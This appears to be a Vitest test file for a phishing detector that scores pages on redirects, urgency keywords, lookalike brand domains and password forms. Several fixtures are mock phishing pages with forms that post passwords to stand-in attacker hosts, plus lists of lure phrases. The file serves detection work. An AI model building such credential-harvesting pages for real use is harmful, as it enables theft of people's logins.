import { afterEach, describe, expect, it, vi } from "vitest";

import { getSusIndex } from "./fishing-checker";

function htmlResponse(html: string, status = 200): Response {
  return new Response(html, {
    status,
    headers: {
      "content-type": "text/html; charset=utf-8"
    }
  });
}

function redirectResponse(location: string, status = 302): Response {
  return new Response("", {
    status,
    headers: {
      location
    }
  });
}

describe("getSusIndex", () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("follows redirects manually and tracks redirect count", async () => {
    const fetchMock = vi
      .fn<typeof fetch>()
      .mockResolvedValueOnce(redirectResponse("https://safe.test/next"))
      .mockResolvedValueOnce(redirectResponse("https://safe.test/final", 301))
      .mockResolvedValueOnce(htmlResponse("<html><body>Hello</body></html>"));

    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://safe.test/start", timeout: 2000 });

    expect(fetchMock).toHaveBeenCalledTimes(3);
    expect(fetchMock.mock.calls[0]?.[1]?.redirect).toBe("manual");
    expect(result.redirectCount).toBe(2);
    expect(result.redirectMatch).toBe(5);
  });

  it("stops when max redirects is reached without following one extra hop", async () => {
    const fetchMock = vi
      .fn<typeof fetch>()
      .mockResolvedValueOnce(redirectResponse("https://safe.test/first"))
      .mockResolvedValueOnce(redirectResponse("https://safe.test/second"));

    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({
      url: "https://safe.test/start",
      timeout: 2000,
      maxRedirects: 1
    });

    expect(fetchMock).toHaveBeenCalledTimes(2);
    expect(fetchMock.mock.calls[0]?.[0]).toBe("https://safe.test/start");
    expect(fetchMock.mock.calls[1]?.[0]).toBe("https://safe.test/first");
    expect(result.redirectCount).toBe(1);
    expect(result.redirectMatch).toBe(3);
  });

  it("flags suspicious content with phishing keywords and password patterns", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockResolvedValue(
      htmlResponse(`
        <html>
          <head><title>Security Alert</title></head>
          <body>
            <p>Verify your account now. Urgent action required.</p>
            <p>Unusual activity detected. Reset password now.</p>
            <form action="https://attacker.test/collect" method="post">
              <input type="hidden" name="email" value="person@example.com" />
              <input type="password" name="password" />
            </form>
          </body>
        </html>
      `)
    );

    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://secure-paypa1.com/login", timeout: 2000 });

    expect(result.keywordMatch).toBeGreaterThanOrEqual(7);
    expect(result.passwordInputMatch).toBeGreaterThanOrEqual(9);
    expect(result.domainSimilarity).toBeGreaterThanOrEqual(7);
    expect(result.rate).toBeGreaterThanOrEqual(7);
  });

  it("returns safe defaults when network fetch fails", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockRejectedValue(new Error("network down"));
    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://github.com", timeout: 500 });

    expect(result.redirectCount).toBe(0);
    expect(result.redirectMatch).toBe(1);
    expect(result.keywordMatch).toBe(1);
    expect(result.passwordInputMatch).toBe(1);
    expect(result.domainSimilarity).toBe(1);
    expect(result.rate).toBe(1);
  });

  it("keeps benign pages at low suspiciousness", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockResolvedValue(
      htmlResponse(`
        <html>
          <head><title>Documentation</title></head>
          <body>
            <h1>Welcome to docs</h1>
            <p>No account verification here.</p>
          </body>
        </html>
      `)
    );

    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://example.org/docs", timeout: 2000 });

    expect(result.keywordMatch).toBeLessThanOrEqual(3);
    expect(result.passwordInputMatch).toBe(1);
    expect(result.rate).toBeLessThanOrEqual(4);
  });

  it("throws when input url is empty", async () => {
    await expect(getSusIndex({ url: "" })).rejects.toThrow("input.url must be a non-empty string");
  });

  it("returns safe domain score when final url cannot be parsed", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockRejectedValue(new TypeError("invalid URL"));
    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "not-a-url", timeout: 500 });

    expect(result.domainSimilarity).toBe(1);
    expect(result.keywordMatch).toBe(1);
    expect(result.passwordInputMatch).toBe(1);
  });

  it("stops on redirect loops", async () => {
    const fetchMock = vi
      .fn<typeof fetch>()
      .mockResolvedValueOnce(redirectResponse("https://loop.test/next"))
      .mockResolvedValueOnce(redirectResponse("https://loop.test/start"));

    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://loop.test/start", timeout: 2000 });

    expect(result.redirectCount).toBe(1);
    expect(result.redirectMatch).toBe(3);
  });

  it("stops when redirect location header is malformed", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockResolvedValue(redirectResponse("http://[::1"));
    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://bad-redirect.test/start", timeout: 2000 });

    expect(result.redirectCount).toBe(0);
    expect(result.redirectMatch).toBe(1);
    expect(result.keywordMatch).toBe(1);
  });

  it("treats non-html responses as missing html signals", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockResolvedValue(
      new Response("PNG", {
        status: 200,
        headers: {
          "content-type": "image/png"
        }
      })
    );

    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://assets.example.com/logo.png", timeout: 2000 });

    expect(result.keywordMatch).toBe(1);
    expect(result.passwordInputMatch).toBe(1);
    expect(result.redirectMatch).toBe(1);
  });

  it("defaults html signals when response text reading fails", async () => {
    const fakeResponse = {
      status: 200,
      headers: {
        get: (name: string) => (name.toLowerCase() === "content-type" ? "text/html; charset=utf-8" : null)
      },
      text: vi.fn().mockRejectedValue(new Error("stream closed"))
    } as unknown as Response;

    const fetchMock = vi.fn<typeof fetch>().mockResolvedValue(fakeResponse);
    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://text-fail.example.com", timeout: 2000 });

    expect(result.keywordMatch).toBe(1);
    expect(result.passwordInputMatch).toBe(1);
  });

  it("scores password-only pages as moderately suspicious", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockResolvedValue(
      htmlResponse(`
        <html>
          <body>
            <form action="/login" method="post">
              <input type="password" name="password" />
            </form>
          </body>
        </html>
      `)
    );

    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://auth.example.com/login", timeout: 2000 });

    expect(result.passwordInputMatch).toBe(7);
  });

  it("scores one suspicious password signal at 9", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockResolvedValue(
      htmlResponse(`
        <html>
          <body>
            <form action="/login" method="post">
              <input type="hidden" name="email" value="person@example.com" />
              <input type="password" name="password" />
            </form>
          </body>
        </html>
      `)
    );

    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://auth.example.com/login", timeout: 2000 });

    expect(result.passwordInputMatch).toBe(9);
  });

  it("defaults to timeout result when no time budget remains", async () => {
    const dateNowSpy = vi.spyOn(Date, "now");
    dateNowSpy.mockReturnValueOnce(1000);
    dateNowSpy.mockReturnValue(1002);

    const fetchMock = vi.fn<typeof fetch>();
    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://timeout.example.com", timeout: 1 });

    expect(fetchMock).not.toHaveBeenCalled();
    expect(result.redirectCount).toBe(0);
    expect(result.keywordMatch).toBe(1);
  });

  it("handles invalid final url origin parsing in password scoring", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockResolvedValue(
      htmlResponse(`
        <html>
          <body>
            <form action="https://evil.example/login" method="post">
              <input type="password" name="password" />
            </form>
          </body>
        </html>
      `)
    );

    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "not-a-url-but-html", timeout: 2000 });

    expect(result.passwordInputMatch).toBe(7);
  });

  it("scores three redirects at redirectMatch 7", async () => {
    const fetchMock = vi
      .fn<typeof fetch>()
      .mockResolvedValueOnce(redirectResponse("https://safe.test/1"))
      .mockResolvedValueOnce(redirectResponse("https://safe.test/2"))
      .mockResolvedValueOnce(redirectResponse("https://safe.test/3"))
      .mockResolvedValueOnce(htmlResponse("<html><body>done</body></html>"));

    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://safe.test/start", timeout: 2000 });
    expect(result.redirectCount).toBe(3);
    expect(result.redirectMatch).toBe(7);
  });

  it("scores five redirects at redirectMatch 10", async () => {
    const fetchMock = vi
      .fn<typeof fetch>()
      .mockResolvedValueOnce(redirectResponse("https://safe.test/1"))
      .mockResolvedValueOnce(redirectResponse("https://safe.test/2"))
      .mockResolvedValueOnce(redirectResponse("https://safe.test/3"))
      .mockResolvedValueOnce(redirectResponse("https://safe.test/4"))
      .mockResolvedValueOnce(redirectResponse("https://safe.test/5"))
      .mockResolvedValueOnce(htmlResponse("<html><body>done</body></html>"));

    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://safe.test/start", timeout: 2000 });
    expect(result.redirectCount).toBe(5);
    expect(result.redirectMatch).toBe(10);
  });

  it("covers low keyword-hit bucket scoring branch", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockResolvedValue(
      htmlResponse(`
        <html>
          <body>
            <p>Please verify your account immediately.</p>
          </body>
        </html>
      `)
    );
    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://example.org", timeout: 2000 });
    expect(result.keywordMatch).toBeGreaterThanOrEqual(3);
    expect(result.keywordMatch).toBeLessThanOrEqual(5);
  });

  it("covers high keyword-hit bucket scoring branch", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockResolvedValue(
      htmlResponse(`
        <html>
          <body>
            <p>Verify your account and confirm password now.</p>
            <p>Password expired. Security alert. Unusual activity detected.</p>
            <p>Unlock account, sign in now, billing update, payment failed.</p>
            <p>Urgent action required. Click here. Reset password. 2FA disabled.</p>
          </body>
        </html>
      `)
    );
    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://example.org", timeout: 2000 });
    expect(result.keywordMatch).toBeGreaterThanOrEqual(9);
  });

  it("applies brand-prefix bonus for trusted brand token prefixes", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockResolvedValue(htmlResponse("<html><body>ok</body></html>"));
    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://paypal-security-notice.example/login", timeout: 2000 });
    expect(result.domainSimilarity).toBeGreaterThanOrEqual(4);
  });

  it("avoids password false positives from script-only content", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockResolvedValue(
      htmlResponse(`
        <html>
          <body>
            <script>
              const fake = '<input type="password" name="password" />';
              const warning = 'urgent action required';
            </script>
            <p>This is a normal public status page.</p>
          </body>
        </html>
      `)
    );
    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://status.example.com", timeout: 2000 });
    expect(result.passwordInputMatch).toBe(1);
  });

  it("detects hidden identity + password regardless attribute order", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockResolvedValue(
      htmlResponse(`
        <html>
          <body>
            <form action="/login" method="post">
              <input name="email" type="hidden" value="person@example.com" />
              <input name="password" type="password" />
            </form>
          </body>
        </html>
      `)
    );
    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://auth.example.com", timeout: 2000 });
    expect(result.passwordInputMatch).toBe(9);
  });

  it("detects unquoted external form action as suspicious", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockResolvedValue(
      htmlResponse(`
        <html>
          <body>
            <form action=https://evil.example/collect method="post">
              <input type="password" name="password" />
            </form>
          </body>
        </html>
      `)
    );
    vi.stubGlobal("fetch", fetchMock);

    const result = await getSusIndex({ url: "https://safe.example.com/login", timeout: 2000 });
    expect(result.passwordInputMatch).toBe(9);
  });
});
